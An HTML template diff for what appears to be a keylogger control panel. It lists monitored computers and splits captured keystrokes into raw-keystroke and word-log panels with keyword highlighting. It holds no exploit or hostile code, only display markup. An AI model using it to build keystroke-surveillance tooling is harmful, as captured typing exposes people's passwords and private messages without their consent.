@@ -72,6 +72,7 @@
             <input type="text" id="search-input" placeholder="Search computers..." class="styled-input">
             <span class="search-icon"><span class="material-symbols-outlined">search</span></span>
         </div>
+        
         <div id="computer-grid">
         </div>
     </div>
@@ -89,9 +90,19 @@
         <div class="info-panel">
             <div>Last Connected: <span id="last-connected"></span></div>
         </div>
-        <h3>Keystroke Log</h3>
-        <div id="keystroke-log">
+
+        <div class="card log-card">
+          <h2>Raw Keystrokes</h2>
+          <ul id="keystroke-log" class="log-list">
+          </ul>
         </div>
+        
+        <div class="card log-card">
+          <h2>Words Log</h2>
+          <ul id="word-log" class="log-list">
+          </ul>
+        </div>
+
         <div class="keyword-container">
             <h4>Keyword Highlighting</h4>
             <div class="input-group-inline">
@@ -99,7 +110,6 @@
                 <button id="add-keyword-button" class="add-button"><span class="material-symbols-outlined">add</span> Add</button>
             </div>
             <div id="keyword-list" class="tag-list">
-                
             </div>
         </div>
         <button id="back-button" class="back-button"><span class="material-symbols-outlined">arrow_back</span> Back to Dashboard</button>
